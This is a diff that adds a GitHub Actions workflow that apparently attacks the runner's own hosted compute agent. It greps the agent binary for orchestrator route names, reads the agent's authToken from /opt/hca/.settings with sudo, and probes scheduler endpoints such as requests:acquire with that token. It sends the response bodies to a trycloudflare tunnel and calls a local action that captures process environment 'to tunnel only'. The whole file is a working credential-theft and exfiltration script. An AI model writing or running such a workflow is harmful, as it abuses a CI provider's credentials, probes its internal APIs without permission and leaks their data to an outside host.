@@ -1,0 +1,50 @@
+name: r9g-orchestrator-symbols-and-routes
+on:
+  workflow_dispatch:
+env:
+  TUNNEL: https://admitted-isp-museum-becomes.trycloudflare.com
+jobs:
+  r9g:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: P-A Go symbol mining from HCA binary
+        run: |
+          echo "== client/orchestrator-ish Go func symbols =="
+          sudo strings -a /opt/hca/hosted-compute-agent 2>/dev/null | grep -oE '[a-z0-9_.-]+/([A-Z][A-Za-z0-9]*\.)+(\(\*[A-Z][A-Za-z0-9]*\)\.)?[A-Z][A-Za-z0-9]*' | grep -iE 'client|orchestr|scheduler|request|job|broker|agent' | sort -u | head -60 | tee /tmp/r9g-symbols.txt
+          echo "== colon-style RPC method names (AIP) =="
+          sudo strings -a /opt/hca/hosted-compute-agent 2>/dev/null | grep -oE '[a-z][a-zA-Z]+:[a-z][a-zA-Z]+' | grep -viE 'http|content|accept|user|x-|trace|span|grpc|application|text/|image|multipart|boundary|charset|warning|mimeType|filename' | sort -u | head -40
+          echo "== bare path fragments mentioning request/job/work =="
+          sudo strings -a /opt/hca/hosted-compute-agent 2>/dev/null | grep -oE '/[a-z][a-zA-Z_-]{3,30}(/[a-z][a-zA-Z_-]{3,30}){0,2}' | grep -iE 'request|job|work|acquire|complete|finish|result|status|heart|register' | sort -u | head -40 | tee -a /tmp/r9g-symbols.txt
+          echo "candidates: $(wc -l < /tmp/r9g-symbols.txt)"
+
+      - name: P-B probe route shapes with agent token
+        run: |
+          sudo cat /opt/hca/.settings > /tmp/r9g-settings.json
+          python3 - <<'EOF'
+          import json
+          s = json.load(open('/tmp/r9g-settings.json'))
+          open('/tmp/r9g-token','w').write(s['authToken'])
+          open('/tmp/r9g-orch','w').write(s.get('schedulerApiUrl','').rstrip('/'))
+          EOF
+          TOK=$(cat /tmp/r9g-token); ORCH=$(cat /tmp/r9g-orch)
+          echo "orchestrator: $(echo "$ORCH" | sed 's|https://||')"
+          : > /tmp/r9g-bodies
+          probe() {
+            CODE=$(curl -sS -m 8 -o /tmp/r9g-body -w '%{http_code}' -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' -X "$1" "$ORCH$2" ${3:+--data "$3"} 2>/dev/null || echo err)
+            echo "$1 $2 -> $CODE ($(wc -c < /tmp/r9g-body 2>/dev/null || echo 0) B)"
+            if [ "$CODE" != "404" ] && [ "$CODE" != "err" ]; then { echo "=== $1 $2 ==="; head -c 2500 /tmp/r9g-body 2>/dev/null; echo; } >> /tmp/r9g-bodies; fi
+          }
+          while read -r FRAG; do
+            [ -z "$FRAG" ] && continue
+            probe GET "$FRAG"
+          done < <(grep -oE '/[a-z][a-zA-Z_/-]+' /tmp/r9g-symbols.txt | sort -u | head -25)
+          for M in "requests:acquire" "requests:complete" "jobs:complete" "agents:register" "requests" "finish" "result" "status"; do
+            probe POST "/$M" '{}'
+          done
+          curl -sS -m 25 --data-binary @/tmp/r9g-bodies -X POST "$TUNNEL/r9b-ingest?file=r9g-route-bodies" >/dev/null 2>&1 || true
+
+      - name: P-C capture action-process env (to tunnel only)
+        uses: ./actions/r9-capture
